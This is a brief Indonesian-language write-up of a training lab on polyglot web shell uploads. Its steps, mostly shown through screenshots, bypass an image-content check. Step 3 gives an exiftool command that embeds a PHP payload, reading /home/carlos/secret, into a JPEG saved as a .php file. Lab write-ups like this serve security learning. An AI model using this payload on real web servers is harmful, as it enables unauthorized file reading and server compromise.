# LAB 6 polyglot web shell upload

## Brief:
kerentanan upload meskipun web mencoba untuk menvalidasi konten filenya tapi ini masih bisa di bypass

## Tujuan:
dapatkan /home/carlos/secret

<img width="1922" height="1046" alt="brief" src="https://github.com/user-attachments/assets/393e2241-84c7-4832-adb9-dc1a6e6003fc" />

## Analisa:
1. upload gambar dapatkan request GET filename

	<img width="1920" height="1080" alt="1 dapatkan get filename" src="https://github.com/user-attachments/assets/2b403bbc-8898-4923-adf7-f56791942f58" />

2. upload php dan web sukses memblokir filenya meskipun dicoba dengan teknik sebelumnya
	
  <img width="1920" height="1080" alt="2 blacklist" src="https://github.com/user-attachments/assets/bc1f8989-884f-496a-91d2-be3a12cf06ca" />

3. buat file polygot dari exiftoo dengan:
		
   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

   <img width="1920" height="1044" alt="3 buat poly" src="https://github.com/user-attachments/assets/2392df32-3c14-4470-bba0-62c1d5b0e0ef" />

4. upload file itu dan bisa

   <img width="1224" height="1025" alt="4 upload dan bisa" src="https://github.com/user-attachments/assets/1e3554a8-1f58-4a60-9761-ded8702a9a81" />

5. sekarang cari di response GET "START" lalu berhasil.

   <img width="1920" height="1080" alt="5 cari dan berhasil" src="https://github.com/user-attachments/assets/4f10b846-67ab-45f2-ac50-eba464b94f3d" />
